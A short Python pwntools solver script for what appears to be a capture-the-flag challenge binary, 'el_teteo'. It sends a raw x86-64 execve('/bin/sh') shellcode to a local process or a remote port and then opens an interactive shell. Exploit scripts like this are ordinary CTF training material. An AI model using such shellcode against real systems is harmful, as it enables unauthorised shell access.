#!/usr/bin/python3
from pwn import *
import warnings
import os

warnings.filterwarnings("ignore")
context.arch = "amd64"

fname = "./el_teteo"

LOCAL = False  # CHANGE THIS TO True if you want to run it locally

os.system("clear")

if LOCAL:
    print("Running solver locally..\n")
    r = process(fname)
else:
    IP = str(sys.argv[1]) if len(sys.argv) >= 2 else "0.0.0.0"
    PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
    r = remote(IP, PORT)
    print(f"Running solver remotely at {IP} {PORT}\n")

# Shellcode from https://shell-storm.org/shellcode/files/shellcode-806.html
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  # ADD THE CORRECT PAYLOAD HERE

# Send shellcode
r.sendlineafter(">", sc)

r.interactive()
